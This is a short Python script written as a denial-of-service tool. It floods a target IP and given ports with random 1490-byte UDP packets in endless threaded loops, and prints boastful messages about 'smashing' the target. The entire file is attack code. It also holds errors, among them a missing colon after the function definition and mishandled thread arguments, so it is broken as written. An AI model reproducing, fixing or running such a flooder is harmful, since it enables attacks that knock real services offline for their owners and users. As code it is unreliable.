import sys
import os
import socket
import random
from datetime import datetime
import threading

if len(sys.argv) != 3:
    print("Something fucked up G")
    sys.exit(1)

ports = [int(port) for port in sys.argv[1:-1]]
ip = sys.argv[-1]

now = datetime.now()
hour = now.hour
munite = now.minute
day = now.day
month = now.month
year = now.year

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

def ddos(port)
    while True:
        sock.sendto(bytes, (ip, port))

def main():
    print("SMASHIN EM!")
    print("They are NOT comming back from this one bro :laugh cry:")
    threads = []
    os.system("clear")
    for port in ports:
        thread = threading.Thread(target=ddos, args=port)
        threads.append(thread)
        thread.start()
    #make sure they finish ddosing
    for thread in threads:
        thread.join()

main()









